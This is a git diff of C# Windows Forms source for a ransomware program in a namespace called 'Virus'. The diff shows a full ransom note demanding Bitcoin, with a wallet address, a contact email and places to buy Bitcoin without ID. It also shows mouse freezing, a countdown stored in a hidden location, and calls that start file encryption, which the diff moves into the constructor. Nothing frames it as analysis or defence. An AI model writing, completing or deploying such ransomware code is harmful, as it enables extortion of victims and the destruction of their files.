@@ -28,26 +28,28 @@ namespace Virus
         {
             FreezeMouse();
             InitializeComponent();
-            AddToStartupReg(); 
+            #region GUI STUFF
             richTextBox1.Text = $"• What Happened To My Computer? \n All of your files have been encrypted and your computer is locked.Do not waste your time trying to guess the decryptor. \n\n• Can I Recover My Files?\n Yes, if you pay before the timer is up you will be provided with a decryption key which will restore your files. Using an incorrect decryption key will fuck up ALL files.\n\n• How Do I Pay?\nTo pay you must purchase {_ransomAmount} worth of Bitcoin and send it to the wallet address below.\nYou can purchase Bitcoin online or at an Bitcoin ATM near you. (https://www.google.com/maps?q=bitcoin+atm)\n\n• How To Get Decryption Key?\nOnce paid email your transaction ID to - {_safeEmail} and you will be provided with a decryption key.\n\n• Here is a list of some places you can buy bitcoin without ID.\n1. Bitcoin ATM \n2. https://www.coincorner.com/ \n3. https://www.bitquick.co/ ";
             textBox2.Text = _bitcoinAddress;
             label1.Text = $"Send {_ransomAmount} worth of bitcoin to the address below.";
-
+            System.Windows.Forms.ToolTip TP = new System.Windows.Forms.ToolTip();
+            TP.ShowAlways = true;
+            TP.SetToolTip(textBox1, "Enter Decryption Key Here.");
+            #endregion
             if (Application.ExecutablePath != decryptexe)
             {
                 var appBytes = File.ReadAllBytes(Application.ExecutablePath);
                 File.WriteAllBytes(decryptexe, appBytes);
             }
-
-            File.WriteAllText(encrypttxt, $"List of files encrypted.");
-            File.WriteAllText(instructionstxt, $"• What Happened To My Computer? \n All of your files have been encrypted and your computer is locked.Do not waste your time trying to guess the decryptor. \n\n• Can I Recover My Files?\n Yes, if you pay before the timer is up you will be provided with a decryption key which will restore your files. Using an incorrect decryption key will fuck up ALL files.\n\n• How Do I Pay?\nTo pay you must purchase {_ransomAmount} worth of Bitcoin and send it to the wallet address below.\nYou can purchase Bitcoin online or at an Bitcoin ATM near you. (https://www.google.com/maps?q=bitcoin+atm)\n\n• How To Get Decryption Key?\nOnce paid email your transaction ID to - {_safeEmail} and you will be provided with a decryption key.\n\n• Here is a list of some places you can buy bitcoin without ID.\n1. Bitcoin ATM \n2. https://www.coincorner.com/ \n3. https://www.bitquick.co/ \n \n {_bitcoinAddress} ");
-
-            if (GetDestroyDate() == null)   //Not first time being run 
+            
+            if (GetFromSecret(DateFinder) == null)   //Not first time being run 
             {
-                DeleteDestroyDate();
-                SetDestroyDate(DateTime.Now.AddHours(_timetopay));
+                File.WriteAllText(encrypttxt, $"List of files encrypted.");
+                File.WriteAllText(instructionstxt, $"• What Happened To My Computer? \n All of your files have been encrypted and your computer is locked.Do not waste your time trying to guess the decryptor. \n\n• Can I Recover My Files?\n Yes, if you pay before the timer is up you will be provided with a decryption key which will restore your files. Using an incorrect decryption key will fuck up ALL files.\n\n• How Do I Pay?\nTo pay you must purchase {_ransomAmount} worth of Bitcoin and send it to the wallet address below.\nYou can purchase Bitcoin online or at an Bitcoin ATM near you. (https://www.google.com/maps?q=bitcoin+atm)\n\n• How To Get Decryption Key?\nOnce paid email your transaction ID to - {_safeEmail} and you will be provided with a decryption key.\n\n• Here is a list of some places you can buy bitcoin without ID.\n1. Bitcoin ATM \n2. https://www.coincorner.com/ \n3. https://www.bitquick.co/ \n \n {_bitcoinAddress} ");
+                SetInSecret(DateTime.Now.AddHours(_timetopay).ToString(), DateFinder);
             }
-            DateTimePlus12Hours = DateTime.Parse(GetDestroyDate());
+            DateTimePlus12Hours = DateTime.Parse(GetFromSecret(DateFinder));
+            StartEncryption();
 
         }
 
@@ -73,13 +75,8 @@ namespace Virus
         private void Form2_Load(object sender, EventArgs e)
         {
             new Task(() => { MessageBox.Show("Dont panic we froze your mouse to give you a chance to read, if you dont pay before the timer countsdown you can say bye bye to all of your files.", "Warning!"); }).Start();
-            //dont go any further
-            LimitUserAccess();
-            new Task(() => { StartEncryption(); }).Start();
+            
             timer1.Start();
-            System.Windows.Forms.ToolTip TP = new System.Windows.Forms.ToolTip();
-            TP.ShowAlways = true;
-            TP.SetToolTip(textBox1, "Enter Decryption Key Here.");
         }
 
         /// <summary>
@@ -104,9 +101,8 @@ namespace Virus
             {
 
                 try
-                {RemoveLimitedAccess();
+                {
                     StartDecryption(textBox1.Text);
-                    
                 }
                 catch
                 {
@@ -125,18 +121,11 @@ namespace Virus
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
-        private int z = 0;
         private int i = 0;
         private void timer1_Tick(object sender, EventArgs e)
         {
-            
-            if (z == 10){
-                ThawMouse();
-            }
-            z++;
-            
             label2.Text = $"Oops {_encryptedFileCount} files have been encrypted.";
-            if (DateTime.Now >= DateTimePlus12Hours && i > 3)
+            if (DateTime.Now >= DateTimePlus12Hours && i > 5)
             {
                 timer1.Stop();
                 MessageBox.Show("You didn't pay in time.", "Sorry!");
